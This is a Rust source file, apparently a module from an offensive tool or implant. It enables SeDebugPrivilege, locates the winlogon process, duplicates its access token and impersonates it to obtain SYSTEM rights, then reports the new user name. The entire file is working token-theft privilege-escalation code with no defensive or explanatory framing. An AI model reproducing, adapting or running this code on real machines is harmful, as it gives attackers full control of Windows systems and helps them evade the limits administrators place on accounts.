use sysinfo::System;
use whoami;
use windows::core::PCSTR;
use windows::Win32::{
    Foundation::{CloseHandle, GetLastError, BOOL, HANDLE, LUID},
    Security::{
        AdjustTokenPrivileges, DuplicateToken, ImpersonateLoggedOnUser, LookupPrivilegeValueA,
        SecurityImpersonation, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED,
        TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_PRIVILEGES,
    },
    System::Threading::{
        GetCurrentProcess, OpenProcess, OpenProcessToken,
        PROCESS_QUERY_INFORMATION,
    },
};

fn get_processes(proc_name: &str) -> Vec<(u32, String)> {
    let sys = System::new_all();
    sys.processes()
        .iter()
        .filter(|(_, n)| n.name().to_lowercase().contains(proc_name))
        .map(|(p, n)| (p.as_u32(), n.name().to_owned()))
        .collect()
}

///
/// Guarantees that SeDebugPrivilege is enabled for our process
///
fn enable_debug() -> Result<(), String> {
    unsafe {
        let current_proc_handle = GetCurrentProcess();
        let mut current_proc_token = HANDLE(0);
        match OpenProcessToken(
            current_proc_handle,
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut current_proc_token,
        ) {
            Ok(_) => {}
            Err(_) => {
                return Err("Couldn't open process token".to_string());
            }
        }

        // DO STUFF
        let mut luid: LUID = std::mem::zeroed();

        match LookupPrivilegeValueA(PCSTR::null(), PCSTR("SeDebugPrivilege\x00".as_ptr()), &mut luid) {
            Ok(_) => {}
            Err(_) => {
                return Err("Couldn't lookup SeDebugPrivilege".to_string());
            }
        };
        let privs = [LUID_AND_ATTRIBUTES {
            Luid: luid,
            Attributes: SE_PRIVILEGE_ENABLED,
        }];

        let mut token_privs = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: privs,
        };

        match AdjustTokenPrivileges(
            current_proc_token,
            BOOL(0),
            Some(&mut token_privs),
            0,
            None,
            None,
        ) {
            Ok(_) => Ok(()),
            Err(_) => Err("Couldn't adjust token privileges".to_string()),
        }
    }
}

pub fn handle() -> Result<String, String> {
    unsafe {
        // Attempt to enable SeDebugPrivilege
        if let Err(e) = enable_debug() {
            return Err(e);
        }

        let mut winlogon_token_handle = HANDLE(0);
        let mut duplicate_token_handle = HANDLE(0);
        let winlogon_processes = get_processes("winlogon");
        if winlogon_processes.is_empty() {
            return Err("Couldn't find winlogon!".to_string());
        }

        let winlogon_pid: u32 = winlogon_processes[0].0;
        // OpenProcess
        if let Ok(winlogon_proc_handle) =
            OpenProcess(PROCESS_QUERY_INFORMATION, false, winlogon_pid)
        {
            // OpenProcessToken
            OpenProcessToken(
                winlogon_proc_handle,
                TOKEN_DUPLICATE,
                &mut winlogon_token_handle,
            )
            .unwrap();
            if winlogon_token_handle.0 == 0 {
                return Err("Couldn't get Winlogon Token!".to_string());
            }
            // Duplicate Token
            DuplicateToken(
                winlogon_token_handle,
                SecurityImpersonation,
                &mut duplicate_token_handle,
            )
            .unwrap();
            if duplicate_token_handle.0 == 0 {
                return Err("Couldn't duplicate token!".to_string());
            }
            // ImpersonateLoggedOnUser
            if let Ok(_) = ImpersonateLoggedOnUser(duplicate_token_handle) {
                CloseHandle(winlogon_proc_handle).unwrap();
                return Ok(format!("I am now {}", whoami::username()));
            }
            return Err("Couldn't get SYSTEM!".to_string());
        } else {
            let error_code = GetLastError();
            return Err(format!("Couldn't Open Process: {}", error_code.0));
        }
    }
}
